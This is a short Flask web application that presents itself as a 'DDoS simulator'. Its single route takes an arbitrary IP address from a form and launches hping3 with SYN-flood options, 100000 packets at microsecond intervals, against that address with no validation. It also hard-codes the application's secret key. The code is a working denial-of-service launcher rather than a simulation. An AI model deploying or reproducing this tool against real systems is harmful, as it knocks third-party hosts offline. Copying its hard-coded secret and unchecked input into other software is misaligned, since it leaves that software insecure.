  
from flask import Flask, render_template, request, url_for, redirect, flash
import subprocess

app = Flask(__name__)
app.config['SECRET_KEY'] = '\xda\x84\x80\xd0\x87\xcf\xa0\x92\xaf\xd3\x9a\x8d\xa8\xb0\xa0o'

@app.route("/ddos-sim", methods=["GET", "POST"])
def ddosSim():
    if request.method == "POST":
        IP = request.form['ip']
        time = request.form['timeout']

        p = subprocess.Popen(["hping3", "-L", "0000", "-p", "++80", "-S", "-c", "100000", \
                              "-Q", "-Vn", "-id", "0xaaaa", "-i", "u1", "-win", "5000", \
                              "-ttl", "254", IP], stdout=subprocess.PIPE)

        try:
           output = p.communicate(timeout=int(time))
        except subprocess.TimeoutExpired:
           p.kill()
           output = p.communicate()

        flash(output)
        return redirect(url_for('ddosSim'))
    return render_template("simulator.html")